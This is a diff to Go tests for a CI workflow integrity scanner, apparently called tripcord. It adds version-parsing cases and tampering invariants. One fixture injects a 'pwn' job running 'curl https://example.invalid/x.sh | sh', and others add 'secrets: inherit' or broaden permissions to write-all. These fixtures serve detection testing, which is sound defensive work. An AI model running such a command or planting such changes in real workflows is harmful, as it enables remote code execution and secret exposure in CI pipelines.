@@ -193,7 +193,8 @@ func TestCheckNewerEmbed(t *testing.T) {
 		"trusted same release":   {CheckOptions{ScannerVersion: "0.1.0"}, StatePinUnknown},
 		"trusted dev":            {CheckOptions{ScannerVersion: "dev"}, StatePinUnknown},
 		"trusted newer release":  {CheckOptions{ScannerVersion: "0.2.0"}, StatePinUnknown},
-		"trusted prerelease 0.1": {CheckOptions{ScannerVersion: "0.1.0-rc.1"}, StateUnverified},
+		"trusted prerelease 0.1": {CheckOptions{ScannerVersion: "0.1.0-rc.1"}, StatePinUnknown},
+		"trusted git describe":   {CheckOptions{ScannerVersion: "0.1.0-12-gdeadbeef"}, StatePinUnknown},
 	} {
 		t.Run(name, func(t *testing.T) {
 			got := states(checkWith(t, dir, tc.opts))
@@ -253,6 +254,18 @@ func TestCheckNewerEmbedInvariants(t *testing.T) {
 		"W5 binary input": {func(t *testing.T, dir string) {
 			replace(t, dir, WorkflowPath, "fail-on: high", "fail-on: high\n      binary: ./tripcord")
 		}, "generic workflow"},
+		"W3 extra job": {func(t *testing.T, dir string) {
+			replace(t, dir, WorkflowPath, "      fail-on: high\n", "      fail-on: high\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/x.sh | sh\n")
+		}, "generic workflow"},
+		"W3 secrets inherit": {func(t *testing.T, dir string) {
+			replace(t, dir, WorkflowPath, "    uses:", "    secrets: inherit\n    uses:")
+		}, "generic workflow"},
+		"W6 permissions broadened": {func(t *testing.T, dir string) {
+			replace(t, dir, WorkflowPath, "      contents: read # checkout the repository being scanned\n      pull-requests: read # tripcord-pr.yml reads pull request reviews\n      security-events: write # upload the SARIF report\n", "      contents: write\n      id-token: write\n")
+		}, "generic workflow"},
+		"W6 permissions write-all": {func(t *testing.T, dir string) {
+			replace(t, dir, WorkflowPath, "permissions:\n  contents: read\n", "permissions: write-all\n")
+		}, "generic workflow"},
 		"S1 install || true": {func(t *testing.T, dir string) {
 			replace(t, dir, CopilotSetupStepsPath, "run: bash .tripcord/bootstrap.sh install", "run: bash .tripcord/bootstrap.sh install || true")
 		}, "copilot setup-step"},
@@ -267,6 +280,27 @@ func TestCheckNewerEmbedInvariants(t *testing.T) {
 				}
 			}
 		})
+	}
+}
+
+// TestCheckFirstIntroductionIsSelfAttested: a base with no embed, a CI
+// scan, and a pin equal to --executing-workflow. The pin is unverified,
+// low. A clean workflow stays low; the shape invariants are what make
+// a mutation high.
+func TestCheckFirstIntroductionIsSelfAttested(t *testing.T) {
+	dir := embed(t)
+	repinWorkflow(t, dir, unknownPin)
+	rerecord(t, dir)
+	exec := &WorkflowRef{Repository: "vgmartinez/tripcord", Path: ReusableWorkflowPath, SHA: unknownPin}
+	empty := func(string) ([]byte, error) { return nil, os.ErrNotExist }
+	got := states(checkWith(t, dir, CheckOptions{Context: ContextCI, Executing: exec, Base: empty, ScannerVersion: "0.0.9"}))
+	if got["generic workflow-pin"] != StateUnverified {
+		t.Fatalf("pin = %q, want unverified: %v", got["generic workflow-pin"], got)
+	}
+	for subject, state := range got {
+		if state == StateChanged || state == StatePinUnknown || state == StatePinMalformed || state == StateRepinned {
+			t.Fatalf("%s = %s on a clean first introduction: %v", subject, state, got)
+		}
 	}
 }
 
@@ -415,7 +449,10 @@ func TestCompareVersions(t *testing.T) {
 			}
 		}
 	}
-	for v, want := range map[string]string{"0.1.0": "0.1.0", "v1.2.3": "1.2.3", "dev": "", "": "", "1.2": "", "abc1234": ""} {
+	for v, want := range map[string]string{
+		"0.1.0": "0.1.0", "v1.2.3": "1.2.3", "dev": "", "": "", "1.2": "", "abc1234": "",
+		"0.1.0-rc.1": "", "0.1.0-12-gdeadbeef": "", "v0.1.0-12-gdeadbeef": "",
+	} {
 		if got := ReleaseVersion(v); got != want {
 			t.Errorf("ReleaseVersion(%q) = %q, want %q", v, got, want)
 		}
